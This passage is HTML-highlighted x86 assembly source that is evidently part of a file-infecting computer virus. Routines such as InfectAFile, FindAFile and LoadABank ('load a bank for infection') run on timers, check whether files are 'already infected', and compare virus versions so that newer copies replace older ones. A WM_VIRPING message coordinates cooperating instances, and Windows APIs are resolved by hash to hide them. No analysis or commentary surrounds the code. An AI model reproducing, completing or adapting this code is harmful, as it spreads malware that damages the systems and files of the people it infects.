    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">goaway</span><span class="sc0">                  </span><span class="sc1">; loop to it</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">regit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; save window handle</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">17357e7Ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; GetTickCount</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; set last counted</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">setzero</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; nullify last counted</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc1">;timerproc:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   ret 16</span><span class="sc0">

</span><span class="sc5">timerset</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetMappedFile</span><span class="sc0">               </span><span class="sc1">; each 50 millisec</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CleanTimeOut</span><span class="sc0">                </span><span class="sc1">; watch if some cecile</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; is not dead</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">hwndval</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; check if we are serv</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">weareserver</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">                  </span><span class="sc1">; check between</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">                  </span><span class="sc1">; 64 1st users</span><span class="sc0">

</span><span class="sc5">getnextimer</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">                  </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; any of it equal our ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">updatetimer</span><span class="sc0">

    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getnextimer</span><span class="sc0">             </span><span class="sc1">; go to next timer</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc2">16</span><span class="sc0">
    
    </span><span class="sc5">updatetimer</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">17357e7Ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; GetTickCount</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; update our life test</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">weareserver</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">17357e7Ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; GetTickCount</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; update server</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; increment counter</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">50</span><span class="sc0">            </span><span class="sc1">; every  sec</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">InfectAFile</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

</span><span class="sc5">benbenit</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipfindFax</span><span class="sc0">             </span><span class="sc1">; every 50 sec</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">benbenit</span><span class="sc0">                </span><span class="sc1">; check 4 times</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">skipfindit</span><span class="sc0">

</span><span class="sc5">skipfindFax</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindAFile</span><span class="sc0">               </span><span class="sc1">; find files</span><span class="sc0">

</span><span class="sc5">skipfindit</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">17357e7Ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; GetTickCount</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; update ping</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; update ping</span><span class="sc0">

</span><span class="sc5">skipit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">switchserver</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; server died</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetMappedFile</span><span class="sc0">               </span><span class="sc1">; load mapped file</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CleanTimeOut</span><span class="sc0">                </span><span class="sc1">; clean the timeouts</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">hwndval</span><span class="sc4">]</span><span class="sc0">     

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">           </span><span class="sc1">; the window is the </span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipthisvoo</span><span class="sc0">             </span><span class="sc1">; server ?</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; yes, then nuliffy</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; everyhting</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">                  </span><span class="sc1">; fix the server</span><span class="sc0">

</span><span class="sc5">getnext77</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; is the current bee</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; load a cecile running</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">goaway66</span><span class="sc0">

    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getnext77</span><span class="sc0">

</span><span class="sc5">skipthisvoo</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">PostQuitit</span><span class="sc0">              </span><span class="sc1">; and leave!</span><span class="sc0">

</span><span class="sc5">goaway66</span><span class="sc4">:</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; we found one ?</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">; set the queen</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; nullify the current</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; cecile bee</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">PostQuitit</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">07818C6Bh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; PostQuitMessage</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc1">;   jmp     translatemessage</span><span class="sc0">

</span><span class="sc5">CleanTimeOut</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; receive in eax the  </span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">  
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">17357e7Ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; GetTickCount</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">64</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">getnext97</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; if null ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">getnext99</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; if smaller then </span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">getnext99</span><span class="sc0">               </span><span class="sc1">; the ping</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; see last ping ?</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">800</span><span class="sc0">             </span><span class="sc1">; server should be alife that</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; moment</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">getnext99</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">WM_VIRPING</span><span class="sc0">          </span><span class="sc1">; ping it</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc2">0FBAC7F60h</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; SendMessageA          </span><span class="sc0">
                        </span><span class="sc1">; the trust pass , </span><span class="sc0">
                        </span><span class="sc1">; Alife or Not ?</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; if alife </span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">cleanit</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; set ping</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">getnext99</span><span class="sc0">

    </span><span class="sc5">cleanit</span><span class="sc4">:</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; nullify client !</span><span class="sc0">

</span><span class="sc5">getnext99</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">getnext97</span><span class="sc0">           </span><span class="sc1">; do it for all</span><span class="sc0">

</span><span class="sc5">goaway785</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">InfectAFile</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; set last infect null</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadAclient</span><span class="sc0">         </span><span class="sc1">; load a client</span><span class="sc0">
    
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">nullsize</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">1024</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; point to file offset</span><span class="sc0">

</span><span class="sc5">loadnext</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">finishallthat0</span><span class="sc0">
    
    </span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">31</span><span class="sc0">            </span><span class="sc1">; test if already </span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">skipinfect</span><span class="sc0">              </span><span class="sc1">; had error ?</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">4000h</span><span class="sc0">         </span><span class="sc1">; already infected ?</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">skipinfect1</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; load the value</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4000h</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getvirusminiversion</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; too advanced version ?</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">skipinfect</span><span class="sc0">          </span><span class="sc1">; see if u need to update it</span><span class="sc0">

</span><span class="sc5">skipinfect1</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">; open error ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">goaway95</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">111111b</span><span class="sc0">         </span><span class="sc1">; 1 chance over 64 of cleaning</span><span class="sc0">
                        </span><span class="sc1">; it</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">111111b</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">skipinfect</span><span class="sc0">

</span><span class="sc5">goaway95</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadABank</span><span class="sc0">           </span><span class="sc1">; load a bank for infection</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; no bank ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">finishallthat0</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">               </span><span class="sc1">; bank okay</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

